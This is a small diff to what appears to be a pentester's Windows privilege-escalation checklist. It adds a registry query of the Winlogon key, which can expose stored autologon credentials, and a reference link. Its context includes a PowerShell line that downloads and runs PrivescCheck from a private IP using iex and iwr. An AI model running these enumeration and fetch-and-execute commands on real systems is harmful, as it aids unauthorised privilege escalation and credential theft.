@@ -34,10 +34,12 @@ functions:
         - [ ] wmic service list full
         - [ ] mountvol
         - [ ] reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
-        - [ ] reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer   
+        - [ ] reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
+        - [ ] reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
 
         - powershell -c "iex(iwr http://192.168.119.149:8000/Invoke-PrivescCheck.ps1 -usebasicparsing);Invoke-PrivescCheck"
 
 resources: |
   https://github.com/itm4n/PrivescCheck
+  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation
 ---
